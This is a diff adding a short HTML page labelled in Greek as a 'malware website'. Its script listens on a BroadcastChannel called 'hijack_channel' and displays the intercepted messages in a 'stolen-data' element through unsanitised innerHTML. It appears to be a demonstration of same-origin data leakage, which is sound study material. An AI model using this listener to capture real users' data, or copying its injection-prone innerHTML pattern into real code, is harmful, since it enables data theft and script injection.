@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+</head>
+
+<body>
+<h2> Ιστοσελίδα Κακόβουλου λογισμικού </h2>
+<p> Δεδομένα...</p>
+<div id="stolen-data"> </div>
+
+
+<script>
+const spyChannel = new BroadcastChannel('hijack_channel');
+
+spyChannel.onmessage=function(event) {
+
+const screen = document.getElementById('stolen-data');
+
+screen.innerHTML +=` <div> ${JSON.stringify(event.data,null,2)} </div>`;
+
+}
+
+
+</script>
+
+
+  </body>
+  </html>
